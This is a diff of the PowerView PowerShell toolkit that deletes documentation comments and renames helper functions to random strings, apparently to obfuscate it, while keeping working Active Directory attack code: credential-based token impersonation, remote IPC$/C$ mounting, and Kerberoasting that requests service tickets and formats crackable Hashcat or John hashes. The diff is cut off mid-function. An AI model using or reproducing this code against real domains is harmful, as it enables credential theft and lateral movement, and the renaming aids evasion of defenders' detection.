-    Canonical         canonical name; e.g., 'fabrikam.com/Engineers/Phineas Flynn'
-    NT4               domain\username; e.g., 'fabrikam\pflynn'
-    Display           display name, e.g. 'pflynn'
-    DomainSimple      simple domain name format, e.g. 'pflynn@fabrikam.com'
-    EnterpriseSimple  simple enterprise name format, e.g. 'pflynn@fabrikam.com'
-    GUID              GUID; e.g., '{95ee9fff-3436-11d1-b2b0-d15ae3ac8436}'
-    UPN               user principal name; e.g., 'pflynn@fabrikam.com'
-    CanonicalEx       extended canonical name format
-    SPN               service principal name format; e.g. 'HTTP/kairomac.contoso.com'
-    SID               Security Identifier; e.g., 'S-1-5-21-12986231-600641547-709122288-57999'
-
-.PARAMETER OutputType
-
-Specifies the output name type you want to convert to, which must be one of the following:
-
-    DN                short for 'distinguished name'; e.g., 'CN=Phineas Flynn,OU=Engineers,DC=fabrikam,DC=com'
-    Canonical         canonical name; e.g., 'fabrikam.com/Engineers/Phineas Flynn'
-    NT4               domain\username; e.g., 'fabrikam\pflynn'
-    Display           display name, e.g. 'pflynn'
-    DomainSimple      simple domain name format, e.g. 'pflynn@fabrikam.com'
-    EnterpriseSimple  simple enterprise name format, e.g. 'pflynn@fabrikam.com'
-    GUID              GUID; e.g., '{95ee9fff-3436-11d1-b2b0-d15ae3ac8436}'
-    UPN               user principal name; e.g., 'pflynn@fabrikam.com'
-    CanonicalEx       extended canonical name format, e.g. 'fabrikam.com/Users/Phineas Flynn'
-    SPN               service principal name format; e.g. 'HTTP/kairomac.contoso.com'
-
-.PARAMETER Domain
-
-Specifies the domain to use for the translation, defaults to the current domain.
-
-.PARAMETER Server
-
-Specifies an Active Directory server (domain controller) to bind to for the translation.
-
-.PARAMETER Credential
-
-Specifies an alternate credential to use for the translation.
-
-.EXAMPLE
-
-Convert-ADName -Identity "TESTLAB\harmj0y"
-
-harmj0y@testlab.local
-
-.EXAMPLE
-
-"TESTLAB\krbtgt", "CN=Administrator,CN=Users,DC=testlab,DC=local" | Convert-ADName -OutputType Canonical
-
-testlab.local/Users/krbtgt
-testlab.local/Users/Administrator
-
-.EXAMPLE
-
-Convert-ADName -OutputType dn -Identity 'TESTLAB\harmj0y' -Server PRIMARY.testlab.local
-
-CN=harmj0y,CN=Users,DC=testlab,DC=local
-
-.EXAMPLE
-
-$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
-$Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\dfm', $SecPassword)
-'S-1-5-21-890171859-3433809279-3366196753-1108' | Convert-ADNAme -Credential $Cred
-
-TESTLAB\harmj0y
-
-.INPUTS
-
-String
-
-Accepts one or more objects name strings on the pipeline.
-
-.OUTPUTS
-
-String
-
-Outputs a string representing the converted name.
-
-.LINK
-
-http://windowsitpro.com/active-directory/translating-active-directory-object-names-between-formats
-https://gallery.technet.microsoft.com/scriptcenter/Translating-Active-5c80dd67
-#>
 
     [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseShouldProcessForStateChangingFunctions', '')]
     [OutputType([String])]
@@ -1880,21 +1084,21 @@ https://gallery.technet.microsoft.com/scriptcenter/Translating-Active-5c80dd67
 
     BEGIN {
         $NameTypes = @{
-            'DN'                =   1  # CN=Phineas Flynn,OU=Engineers,DC=fabrikam,DC=com
-            'Canonical'         =   2  # fabrikam.com/Engineers/Phineas Flynn
-            'NT4'               =   3  # fabrikam\pflynn
-            'Display'           =   4  # pflynn
-            'DomainSimple'      =   5  # pflynn@fabrikam.com
-            'EnterpriseSimple'  =   6  # pflynn@fabrikam.com
-            'GUID'              =   7  # {95ee9fff-3436-11d1-b2b0-d15ae3ac8436}
-            'Unknown'           =   8  # unknown type - let the server do translation
-            'UPN'               =   9  # pflynn@fabrikam.com
-            'CanonicalEx'       =   10 # fabrikam.com/Users/Phineas Flynn
-            'SPN'               =   11 # HTTP/kairomac.contoso.com
-            'SID'               =   12 # S-1-5-21-12986231-600641547-709122288-57999
+            'DN'                =   1  
+            'Canonical'         =   2  
+            'NT4'               =   3  
+            'Display'           =   4  
+            'DomainSimple'      =   5  
+            'EnterpriseSimple'  =   6  
+            'GUID'              =   7  
+            'Unknown'           =   8  
+            'UPN'               =   9  
+            'CanonicalEx'       =   10 
+            'SPN'               =   11 
+            'SID'               =   12 
         }
 
-        # accessor functions from Bill Stewart to simplify calls to NameTranslate
+        
         function Invoke-Method([__ComObject] $Object, [String] $Method, $Parameters) {
             $Output = $Null
             $Output = $Object.GetType().InvokeMember($Method, 'InvokeMethod', $NULL, $Object, $Parameters)
@@ -1909,7 +1113,7 @@ https://gallery.technet.microsoft.com/scriptcenter/Translating-Active-5c80dd67
             [Void] $Object.GetType().InvokeMember($Property, 'SetProperty', $NULL, $Object, $Parameters)
         }
 
-        # https://msdn.microsoft.com/en-us/library/aa772266%28v=vs.85%29.aspx
+        
         if ($PSBoundParameters['Server']) {
             $ADSInitType = 2
             $InitName = $Server
@@ -1924,7 +1128,7 @@ https://gallery.technet.microsoft.com/scriptcenter/Translating-Active-5c80dd67
             $InitName = $Cred.Domain
         }
         else {
-            # if no domain or server is specified, default to GC initialization
+            
             $ADSInitType = 3
             $InitName = $Null
         }
@@ -1974,11 +1178,11 @@ https://gallery.technet.microsoft.com/scriptcenter/Translating-Active-5c80dd67
                 }
             }
 
-            # always chase all referrals
+            
             Set-Property $Translate 'ChaseReferral' (0x60)
 
             try {
-                # 8 = Unknown name type -> let the server do the work for us
+                
                 $Null = Invoke-Method $Translate 'Set' (8, $TargetIdentity)
                 Invoke-Method $Translate 'Get' ($ADSOutputType)
             }
@@ -1991,95 +1195,7 @@ https://gallery.technet.microsoft.com/scriptcenter/Translating-Active-5c80dd67
 
 
 function ConvertFrom-UACValue {
-<#
-.SYNOPSIS
 
-Converts a UAC int value to human readable form.
-
-Author: Will Schroeder (@harmj0y)  
-License: BSD 3-Clause  
-Required Dependencies: None  
-
-.DESCRIPTION
-
-This function will take an integer that represents a User Account
-Control (UAC) binary blob and will covert it to an ordered
-dictionary with each bitwise value broken out. By default only values
-set are displayed- the -ShowAll switch will display all values with
-a + next to the ones set.
-
-.PARAMETER Value
-
-Specifies the integer UAC value to convert.
-
-.PARAMETER ShowAll
-
-Switch. Signals ConvertFrom-UACValue to display all UAC values, with a + indicating the value is currently set.
-
-.EXAMPLE
-
-ConvertFrom-UACValue -Value 66176
-
-Name                           Value
-----                           -----
-ENCRYPTED_TEXT_PWD_ALLOWED     128
-NORMAL_ACCOUNT                 512
-DONT_EXPIRE_PASSWORD           65536
-
-.EXAMPLE
-
-Get-DomainUser harmj0y | ConvertFrom-UACValue
-
-Name                           Value
-----                           -----
-NORMAL_ACCOUNT                 512
-DONT_EXPIRE_PASSWORD           65536
-
-.EXAMPLE
-
-Get-DomainUser harmj0y | ConvertFrom-UACValue -ShowAll
-
-Name                           Value
-----                           -----
-SCRIPT                         1
-ACCOUNTDISABLE                 2
-HOMEDIR_REQUIRED               8
-LOCKOUT                        16
-PASSWD_NOTREQD                 32
-PASSWD_CANT_CHANGE             64
-ENCRYPTED_TEXT_PWD_ALLOWED     128
-TEMP_DUPLICATE_ACCOUNT         256
-NORMAL_ACCOUNT                 512+
-INTERDOMAIN_TRUST_ACCOUNT      2048
-WORKSTATION_TRUST_ACCOUNT      4096
-SERVER_TRUST_ACCOUNT           8192
-DONT_EXPIRE_PASSWORD           65536+
-MNS_LOGON_ACCOUNT              131072
-SMARTCARD_REQUIRED             262144
-TRUSTED_FOR_DELEGATION         524288
-NOT_DELEGATED                  1048576
-USE_DES_KEY_ONLY               2097152
-DONT_REQ_PREAUTH               4194304
-PASSWORD_EXPIRED               8388608
-TRUSTED_TO_AUTH_FOR_DELEGATION 16777216
-PARTIAL_SECRETS_ACCOUNT        67108864
-
-.INPUTS
-
-Int
-
-Accepts an integer representing a UAC binary blob.
-
-.OUTPUTS
-
-System.Collections.Specialized.OrderedDictionary
-
-An ordered dictionary with the converted UAC fields.
-
-.LINK
-
-https://support.microsoft.com/en-us/kb/305144
-#>
 
     [OutputType('System.Collections.Specialized.OrderedDictionary')]
     [CmdletBinding()]
@@ -2094,7 +1210,7 @@ https://support.microsoft.com/en-us/kb/305144
     )
 
     BEGIN {
-        # values from https://support.microsoft.com/en-us/kb/305144
+        
         $UACValues = New-Object System.Collections.Specialized.OrderedDictionary
         $UACValues.Add("SCRIPT", 1)
         $UACValues.Add("ACCOUNTDISABLE", 2)
@@ -2145,32 +1261,8 @@ https://support.microsoft.com/en-us/kb/305144
 }
 
 
-function Get-PrincipalContext {
-<#
-.SYNOPSIS
+function X23WOD9H {
 
-Helper to take an Identity and return a DirectoryServices.AccountManagement.PrincipalContext
-and simplified identity.
-
-Author: Will Schroeder (@harmj0y)  
-License: BSD 3-Clause  
-Required Dependencies: None  
-
-.PARAMETER Identity
-
-A group SamAccountName (e.g. Group1), DistinguishedName (e.g. CN=group1,CN=Users,DC=testlab,DC=local),
-SID (e.g. S-1-5-21-890171859-3433809279-3366196753-1114), or GUID (e.g. 4c435dd7-dc58-4b14-9a5e-1fdb0e80d202),
-or a DOMAIN\username identity.
-
-.PARAMETER Domain
-
-Specifies the domain to use to search for user/group principals, defaults to the current domain.
-
-.PARAMETER Credential
-
-A [Management.Automation.PSCredential] object of alternate credentials
-for connection to the target domain.
-#>
 
     [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
     [CmdletBinding()]
@@ -2194,22 +1286,22 @@ for connection to the target domain.
     try {
         if ($PSBoundParameters['Domain'] -or ($Identity -match '.+\\.+')) {
             if ($Identity -match '.+\\.+') {
-                # DOMAIN\groupname
+                
                 $ConvertedIdentity = $Identity | Convert-ADName -OutputType Canonical
                 if ($ConvertedIdentity) {
                     $ConnectTarget = $ConvertedIdentity.SubString(0, $ConvertedIdentity.IndexOf('/'))
                     $ObjectIdentity = $Identity.Split('\')[1]
-                    Write-Verbose "[Get-PrincipalContext] Binding to domain '$ConnectTarget'"
+                    Write-Verbose "[X23WOD9H] Binding to domain '$ConnectTarget'"
                 }
             }
             else {
                 $ObjectIdentity = $Identity
-                Write-Verbose "[Get-PrincipalContext] Binding to domain '$Domain'"
+                Write-Verbose "[X23WOD9H] Binding to domain '$Domain'"
                 $ConnectTarget = $Domain
             }
 
             if ($PSBoundParameters['Credential']) {
-                Write-Verbose '[Get-PrincipalContext] Using alternate credentials'
+                Write-Verbose '[X23WOD9H] Using alternate credentials'
                 $Context = New-Object -TypeName System.DirectoryServices.AccountManagement.PrincipalContext -ArgumentList ([System.DirectoryServices.AccountManagement.ContextType]::Domain, $ConnectTarget, $Credential.UserName, $Credential.GetNetworkCredential().Password)
             }
             else {
@@ -2218,7 +1310,7 @@ for connection to the target domain.
         }
         else {
             if ($PSBoundParameters['Credential']) {
-                Write-Verbose '[Get-PrincipalContext] Using alternate credentials'
+                Write-Verbose '[X23WOD9H] Using alternate credentials'
                 $DomainName = Get-Domain | Select-Object -ExpandProperty Name
                 $Context = New-Object -TypeName System.DirectoryServices.AccountManagement.PrincipalContext -ArgumentList ([System.DirectoryServices.AccountManagement.ContextType]::Domain, $DomainName, $Credential.UserName, $Credential.GetNetworkCredential().Password)
             }
@@ -2234,61 +1326,13 @@ for connection to the target domain.
         $Out
     }
     catch {
-        Write-Warning "[Get-PrincipalContext] Error creating binding for object ('$Identity') context : $_"
+        Write-Warning "[X23WOD9H] Error creating binding for object ('$Identity') context : $_"
     }
 }
 
 
-function Add-RemoteConnection {
-<#
-.SYNOPSIS
+function MKK4QQPC {
 
-Pseudo "mounts" a connection to a remote path using the specified
-credential object, allowing for access of remote resources. If a -Path isn't
-specified, a -ComputerName is required to pseudo-mount IPC$.
-
-Author: Will Schroeder (@harmj0y)  
-License: BSD 3-Clause  
-Required Dependencies: PSReflect  
-
-.DESCRIPTION
-
-This function uses WNetAddConnection2W to make a 'temporary' (i.e. not saved) connection
-to the specified remote -Path (\\UNC\share) with the alternate credentials specified in the
--Credential object. If a -Path isn't specified, a -ComputerName is required to pseudo-mount IPC$.
-
-To destroy the connection, use Remove-RemoteConnection with the same specified \\UNC\share path
-or -ComputerName.
-
-.PARAMETER ComputerName
-
-Specifies the system to add a \\ComputerName\IPC$ connection for.
-
-.PARAMETER Path
-
-Specifies the remote \\UNC\path to add the connection for.
-
-.PARAMETER Credential
-
-A [Management.Automation.PSCredential] object of alternate credentials
-for connection to the remote system.
-
-.EXAMPLE
-
-$Cred = Get-Credential
-Add-RemoteConnection -ComputerName 'PRIMARY.testlab.local' -Credential $Cred
-
-.EXAMPLE
-
-$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
-$Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\dfm.a', $SecPassword)
-Add-RemoteConnection -Path '\\PRIMARY.testlab.local\C$\' -Credential $Cred
-
-.EXAMPLE
-
-$Cred = Get-Credential
-@('PRIMARY.testlab.local','SECONDARY.testlab.local') | Add-RemoteConnection  -Credential $Cred
-#>
 
     [CmdletBinding(DefaultParameterSetName = 'ComputerName')]
     Param(
@@ -2328,59 +1372,25 @@ $Cred = Get-Credential
 
         ForEach ($TargetPath in $Paths) {
             $NetResourceInstance.lpRemoteName = $TargetPath
-            Write-Verbose "[Add-RemoteConnection] Attempting to mount: $TargetPath"
+            Write-Verbose "[MKK4QQPC] Attempting to mount: $TargetPath"
 
-            # https://msdn.microsoft.com/en-us/library/windows/desktop/aa385413(v=vs.85).aspx
-            #   CONNECT_TEMPORARY = 4
+            
+            
             $Result = $Mpr::WNetAddConnection2W($NetResourceInstance, $Credential.GetNetworkCredential().Password, $Credential.UserName, 4)
 
             if ($Result -eq 0) {
                 Write-Verbose "$TargetPath successfully mounted"
             }
             else {
-                Throw "[Add-RemoteConnection] error mounting $TargetPath : $(([ComponentModel.Win32Exception]$Result).Message)"
+                Throw "[MKK4QQPC] error mounting $TargetPath : $(([ComponentModel.Win32Exception]$Result).Message)"
             }
         }
     }
 }
 
 
-function Remove-RemoteConnection {
-<#
-.SYNOPSIS
+function TUGT2IL3 {
 
-Destroys a connection created by New-RemoteConnection.
-
-Author: Will Schroeder (@harmj0y)  
-License: BSD 3-Clause  
-Required Dependencies: PSReflect  
-
-.DESCRIPTION
-
-This function uses WNetCancelConnection2 to destroy a connection created by
-New-RemoteConnection. If a -Path isn't specified, a -ComputerName is required to
-'unmount' \\$ComputerName\IPC$.
-
-.PARAMETER ComputerName
-
-Specifies the system to remove a \\ComputerName\IPC$ connection for.
-
-.PARAMETER Path
-
-Specifies the remote \\UNC\path to remove the connection for.
-
-.EXAMPLE
-
-Remove-RemoteConnection -ComputerName 'PRIMARY.testlab.local'
-
-.EXAMPLE
-
-Remove-RemoteConnection -Path '\\PRIMARY.testlab.local\C$\'
-
-.EXAMPLE
-
-@('PRIMARY.testlab.local','SECONDARY.testlab.local') | Remove-RemoteConnection
-#>
 
     [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseShouldProcessForStateChangingFunctions', '')]
     [CmdletBinding(DefaultParameterSetName = 'ComputerName')]
@@ -2410,64 +1420,22 @@ Remove-RemoteConnection -Path '\\PRIMARY.testlab.local\C$\'
         }
 
         ForEach ($TargetPath in $Paths) {
-            Write-Verbose "[Remove-RemoteConnection] Attempting to unmount: $TargetPath"
+            Write-Verbose "[TUGT2IL3] Attempting to unmount: $TargetPath"
             $Result = $Mpr::WNetCancelConnection2($TargetPath, 0, $True)
 
             if ($Result -eq 0) {
                 Write-Verbose "$TargetPath successfully ummounted"
             }
             else {
-                Throw "[Remove-RemoteConnection] error unmounting $TargetPath : $(([ComponentModel.Win32Exception]$Result).Message)"
+                Throw "[TUGT2IL3] error unmounting $TargetPath : $(([ComponentModel.Win32Exception]$Result).Message)"
             }
         }
     }
 }
 
 
-function Invoke-UserImpersonation {
-<#
-.SYNOPSIS
+function ECK2AE5S {
 
-Creates a new "runas /netonly" type logon and impersonates the token.
-
-Author: Will Schroeder (@harmj0y)  
-License: BSD 3-Clause  
-Required Dependencies: PSReflect  
-
-.DESCRIPTION
-
-This function uses LogonUser() with the LOGON32_LOGON_NEW_CREDENTIALS LogonType
-to simulate "runas /netonly". The resulting token is then impersonated with
-ImpersonateLoggedOnUser() and the token handle is returned for later usage
-with Invoke-RevertToSelf.
-
-.PARAMETER Credential
-
-A [Management.Automation.PSCredential] object with alternate credentials
-to impersonate in the current thread space.
-
-.PARAMETER TokenHandle
-
-An IntPtr TokenHandle returned by a previous Invoke-UserImpersonation.
-If this is supplied, LogonUser() is skipped and only ImpersonateLoggedOnUser()
-is executed.
-
-.PARAMETER Quiet
-
-Suppress any warnings about STA vs MTA.
-
-.EXAMPLE
-
-$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
-$Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\dfm.a', $SecPassword)
-Invoke-UserImpersonation -Credential $Cred
-
-.OUTPUTS
-
-IntPtr
-
-The TokenHandle result from LogonUser.
-#>
 
     [OutputType([IntPtr])]
     [CmdletBinding(DefaultParameterSetName = 'Credential')]
@@ -2487,7 +1455,7 @@ The TokenHandle result from LogonUser.
     )
 
     if (([System.Threading.Thread]::CurrentThread.GetApartmentState() -ne 'STA') -and (-not $PSBoundParameters['Quiet'])) {
-        Write-Warning "[Invoke-UserImpersonation] powershell.exe is not currently in a single-threaded apartment state, token impersonation may not work."
+        Write-Warning "[ECK2AE5S] powershell.exe is not currently in a single-threaded apartment state, token impersonation may not work."
     }
 
     if ($PSBoundParameters['TokenHandle']) {
@@ -2498,56 +1466,31 @@ The TokenHandle result from LogonUser.
         $NetworkCredential = $Credential.GetNetworkCredential()
         $UserDomain = $NetworkCredential.Domain
         $UserName = $NetworkCredential.UserName
-        Write-Warning "[Invoke-UserImpersonation] Executing LogonUser() with user: $($UserDomain)\$($UserName)"
+        Write-Warning "[ECK2AE5S] Executing LogonUser() with user: $($UserDomain)\$($UserName)"
 
-        # LOGON32_LOGON_NEW_CREDENTIALS = 9, LOGON32_PROVIDER_WINNT50 = 3
-        #   this is to simulate "runas.exe /netonly" functionality
+        
+        
         $Result = $Advapi32::LogonUser($UserName, $UserDomain, $NetworkCredential.Password, 9, 3, [ref]$LogonTokenHandle);$LastError = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error();
 
         if (-not $Result) {
-            throw "[Invoke-UserImpersonation] LogonUser() Error: $(([ComponentModel.Win32Exception] $LastError).Message)"
+            throw "[ECK2AE5S] LogonUser() Error: $(([ComponentModel.Win32Exception] $LastError).Message)"
         }
     }
 
-    # actually impersonate the token from LogonUser()
+    
     $Result = $Advapi32::ImpersonateLoggedOnUser($LogonTokenHandle)
 
     if (-not $Result) {
-        throw "[Invoke-UserImpersonation] ImpersonateLoggedOnUser() Error: $(([ComponentModel.Win32Exception] $LastError).Message)"
+        throw "[ECK2AE5S] ImpersonateLoggedOnUser() Error: $(([ComponentModel.Win32Exception] $LastError).Message)"
     }
 
-    Write-Verbose "[Invoke-UserImpersonation] Alternate credentials successfully impersonated"
+    Write-Verbose "[ECK2AE5S] Alternate credentials successfully impersonated"
     $LogonTokenHandle
 }
 
 
-function Invoke-RevertToSelf {
-<#
-.SYNOPSIS
+function JCUMHZOK {
 
-Reverts any token impersonation.
-
-Author: Will Schroeder (@harmj0y)  
-License: BSD 3-Clause  
-Required Dependencies: PSReflect  
-
-.DESCRIPTION
-
-This function uses RevertToSelf() to revert any impersonated tokens.
-If -TokenHandle is passed (the token handle returned by Invoke-UserImpersonation),
-CloseHandle() is used to close the opened handle.
-
-.PARAMETER TokenHandle
-
-An optional IntPtr TokenHandle returned by Invoke-UserImpersonation.
-
-.EXAMPLE
-
-$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
-$Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\dfm.a', $SecPassword)
-$Token = Invoke-UserImpersonation -Credential $Cred
-Invoke-RevertToSelf -TokenHandle $Token
-#>
 
     [CmdletBinding()]
     Param(
@@ -2557,92 +1500,22 @@ Invoke-RevertToSelf -TokenHandle $Token
     )
 
     if ($PSBoundParameters['TokenHandle']) {
-        Write-Warning "[Invoke-RevertToSelf] Reverting token impersonation and closing LogonUser() token handle"
+        Write-Warning "[JCUMHZOK] Reverting token impersonation and closing LogonUser() token handle"
         $Result = $Kernel32::CloseHandle($TokenHandle)
     }
 
     $Result = $Advapi32::RevertToSelf();$LastError = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error();
 
     if (-not $Result) {
-        throw "[Invoke-RevertToSelf] RevertToSelf() Error: $(([ComponentModel.Win32Exception] $LastError).Message)"
+        throw "[JCUMHZOK] RevertToSelf() Error: $(([ComponentModel.Win32Exception] $LastError).Message)"
     }
 
-    Write-Verbose "[Invoke-RevertToSelf] Token impersonation successfully reverted"
+    Write-Verbose "[JCUMHZOK] Token impersonation successfully reverted"
 }
 
 
-function Get-DomainSPNTicket {
-<#
-.SYNOPSIS
+function 4DS1B0PY {
 
-Request the kerberos ticket for a specified service principal name (SPN).
-
-Author: machosec, Will Schroeder (@harmj0y)  
-License: BSD 3-Clause  
-Required Dependencies: Invoke-UserImpersonation, Invoke-RevertToSelf  
-
-.DESCRIPTION
-
-This function will either take one/more SPN strings, or one/more PowerView.User objects
-(the output from Get-DomainUser) and will request a kerberos ticket for the given SPN
-using System.IdentityModel.Tokens.KerberosRequestorSecurityToken. The encrypted
-portion of the ticket is then extracted and output in either crackable John or Hashcat
-format (deafult of Hashcat).
-
-.PARAMETER SPN
-
-Specifies the service principal name to request the ticket for.
-
-.PARAMETER User
-
-Specifies a PowerView.User object (result of Get-DomainUser) to request the ticket for.
-
-.PARAMETER OutputFormat
-
-Either 'John' for John the Ripper style hash formatting, or 'Hashcat' for Hashcat format.
-Defaults to 'John'.
-
-.PARAMETER Credential
-
-A [Management.Automation.PSCredential] object of alternate credentials
-for connection to the remote domain using Invoke-UserImpersonation.
-
-.EXAMPLE
-
-Get-DomainSPNTicket -SPN "HTTP/web.testlab.local"
-
-Request a kerberos service ticket for the specified SPN.
-
-.EXAMPLE
-
-"HTTP/web1.testlab.local","HTTP/web2.testlab.local" | Get-DomainSPNTicket
-
-Request kerberos service tickets for all SPNs passed on the pipeline.
-
-.EXAMPLE
-
-Get-DomainUser -SPN | Get-DomainSPNTicket -OutputFormat JTR
-
-Request kerberos service tickets for all users with non-null SPNs and output in JTR format.
-
-.INPUTS
-
-String
-
-Accepts one or more SPN strings on the pipeline with the RawSPN parameter set.
-
-.INPUTS
-
-PowerView.User
-
-Accepts one or more PowerView.User objects on the pipeline with the User parameter set.
-
-.OUTPUTS
-
-PowerView.SPNTicket
-
-Outputs a custom object containing the SamAccountName, ServicePrincipalName, and encrypted ticket section.
-#>
 
     [OutputType('PowerView.SPNTicket')]
     [CmdletBinding(DefaultParameterSetName = 'RawSPN')]
@@ -2672,7 +1545,7 @@ Outputs a custom object containing the SamAccountName, ServicePrincipalName, and
         $Null = [Reflection.Assembly]::LoadWithPartialName('System.IdentityModel')
 
         if ($PSBoundParameters['Credential']) {
-            $LogonToken = Invoke-UserImpersonation -Credential $Credential
+            $LogonToken = ECK2AE5S -Credential $Credential
         }
     }
 
@@ -2696,7 +1569,7 @@ Outputs a custom object containing the SamAccountName, ServicePrincipalName, and
                 $DistinguishedName = 'UNKNOWN'
             }
 
-            # if a user has multiple SPNs we only take the first one otherwise the service ticket request fails miserably :) -@st3r30byt3
+            
             if ($UserSPN -is [System.DirectoryServices.ResultPropertyValueCollection]) {
                 $UserSPN = $UserSPN[0]
             }
@@ -2705,7 +1578,7 @@ Outputs a custom object containing the SamAccountName, ServicePrincipalName, and
                 $Ticket = New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $UserSPN
             }
             catch {
-                Write-Warning "[Get-DomainSPNTicket] Error requesting ticket for SPN '$UserSPN' from user '$DistinguishedName' : $_"
+                Write-Warning "[4DS1B0PY] Error requesting ticket for SPN '$UserSPN' from user '$DistinguishedName' : $_"
             }
             if ($Ticket) {
                 $TicketByteStream = $Ticket.GetRequest()
@@ -2719,14 +1592,14 @@ Outputs a custom object containing the SamAccountName, ServicePrincipalName, and
                 $Out | Add-Member Noteproperty 'DistinguishedName' $DistinguishedName
                 $Out | Add-Member Noteproperty 'ServicePrincipalName' $Ticket.ServicePrincipalName
 
-                # TicketHexStream == GSS-API Frame (see https://tools.ietf.org/html/rfc4121#section-4.1)
-                # No easy way to parse ASN1, so we'll try some janky regex to parse the embedded KRB_AP_REQ.Ticket object
+                
+                
                 if($TicketHexStream -match 'a382....3082....A0030201(?<EtypeLen>..)A1.{1,4}.......A282(?<CipherTextLen>....)........(?<DataToEnd>.+)') {
                     $Etype = [Convert]::ToByte( $Matches.EtypeLen, 16 )
                     $CipherTextLen = [Convert]::ToUInt32($Matches.CipherTextLen, 16)-4
                     $CipherText = $Matches.DataToEnd.Substring(0,$CipherTextLen*2)
 
-                    # Make sure the next field matches the beginning of the KRB_AP_REQ.Authenticator object
+                    
                     if($Matches.DataToEnd.Substring($CipherTextLen*2, 4) -ne 'A482') {
                         Write-Warning "Error parsing ciphertext for the SPN  $($Ticket.ServicePrincipalName). Use the TicketByteHexStream field and extract the hash offline with Get-KerberoastHashFromAPReq"
                         $Hash = $null
@@ -2742,7 +1615,7 @@ Outputs a custom object containing the SamAccountName, ServicePrincipalName, and
                 }
 
                 if($Hash) {
-                    # JTR jumbo output format - $krb5tgs$SPN/machine.testlab.local:63386d22d359fe...
+                    
                     if ($OutputFormat -match 'John') {
                         $HashFormat = "`$krb5tgs`$$($Ticket.ServicePrincipalName):$Hash"
                     }
@@ -2754,7 +1627,7 @@ Outputs a custom object containing the SamAccountName, ServicePrincipalName, and
                             $UserDomain = 'UNKNOWN'
                         }
 
-                        # hashcat output format - $krb5tgs$23$*user$realm$test/spn*$63386d22d359fe...
+                        
                         $HashFormat = "`$krb5tgs`$$($Etype)`$*$SamAccountName`$$UserDomain`$$($Ticket.ServicePrincipalName)*`$$Hash"
                     }
                     $Out | Add-Member Noteproperty 'Hash' $HashFormat
@@ -2768,104 +1641,14 @@ Outputs a custom object containing the SamAccountName, ServicePrincipalName, and
 
     END {
         if ($LogonToken) {
-            Invoke-RevertToSelf -TokenHandle $LogonToken
+            JCUMHZOK -TokenHandle $LogonToken
         }
     }
 }
 
 
 function Invoke-Kerberoast {
-<#
-.SYNOPSIS
 
-Requests service tickets for kerberoast-able accounts and returns extracted ticket hashes.
-
-Author: Will Schroeder (@harmj0y), @machosec  
-License: BSD 3-Clause  
-Required Dependencies: Invoke-UserImpersonation, Invoke-RevertToSelf, Get-DomainUser, Get-DomainSPNTicket  
-
-.DESCRIPTION
-
-Uses Get-DomainUser to query for user accounts with non-null service principle
-names (SPNs) and uses Get-SPNTicket to request/extract the crackable ticket information.
-The ticket format can be specified with -OutputFormat <John/Hashcat>.
-
-.PARAMETER Identity
-
-A SamAccountName (e.g. harmj0y), DistinguishedName (e.g. CN=harmj0y,CN=Users,DC=testlab,DC=local),
-SID (e.g. S-1-5-21-890171859-3433809279-3366196753-1108), or GUID (e.g. 4c435dd7-dc58-4b14-9a5e-1fdb0e80d201).
-Wildcards accepted.
-
-.PARAMETER Domain
-
-Specifies the domain to use for the query, defaults to the current domain.
-
-.PARAMETER LDAPFilter
-
-Specifies an LDAP query string that is used to filter Active Directory objects.
-
-.PARAMETER SearchBase
-
-The LDAP source to search through, e.g. "LDAP://OU=secret,DC=testlab,DC=local"
-Useful for OU queries.
-
-.PARAMETER Server
-
-Specifies an Active Directory server (domain controller) to bind to.
-
-.PARAMETER SearchScope
-
-Specifies the scope to search under, Base/OneLevel/Subtree (default of Subtree).
-
-.PARAMETER ResultPageSize
-
-Specifies the PageSize to set for the LDAP searcher object.
-
-.PARAMETER ServerTimeLimit
-
-Specifies the maximum amount of time the server spends searching. Default of 120 seconds.
-
-.PARAMETER Tombstone
-
-Switch. Specifies that the searcher should also return deleted/tombstoned objects.
-
-.PARAMETER OutputFormat
-
-Either 'John' for John the Ripper style hash formatting, or 'Hashcat' for Hashcat format.
-Defaults to 'Hashcat'.
-
-.PARAMETER Credential
-
-A [Management.Automation.PSCredential] object of alternate credentials
-for connection to the target domain.
-
-.EXAMPLE
-
-Invoke-Kerberoast | fl
-
-Kerberoasts all found SPNs for the current domain, outputting to Hashcat format (default).
-
-.EXAMPLE
-
-Invoke-Kerberoast -Domain dev.testlab.local | fl
-
-Kerberoasts all found SPNs for the testlab.local domain, outputting to JTR
-format instead of Hashcat.
-
-.EXAMPLE
-
-$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -orce
-$Cred = New-Object System.Management.Automation.PSCredential('TESTLB\dfm.a', $SecPassword)
-Invoke-Kerberoast -Credential $Cred -Verbose -Domain testlab.local | fl
-
-Kerberoasts all found SPNs for the testlab.local domain using alternate credentials.
-
-.OUTPUTS
-
-PowerView.SPNTicket
-
-Outputs a custom object containing the SamAccountName, ServicePrincipalName, and encrypted ticket section.
-#>
 
     [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
     [OutputType('PowerView.SPNTicket')]
@@ -2936,80 +1719,25 @@ Outputs a custom object containing the SamAccountName, ServicePrincipalName, and
         if ($PSBoundParameters['Credential']) { $UserSearcherArguments['Credential'] = $Credential }
 
         if ($PSBoundParameters['Credential']) {
-            $LogonToken = Invoke-UserImpersonation -Credential $Credential
+            $LogonToken = ECK2AE5S -Credential $Credential
         }
     }
 
     PROCESS {
         if ($PSBoundParameters['Identity']) { $UserSearcherArguments['Identity'] = $Identity }
-        Get-DomainUser @UserSearcherArguments | Where-Object {$_.samaccountname -ne 'krbtgt'} | Get-DomainSPNTicket -OutputFormat $OutputFormat
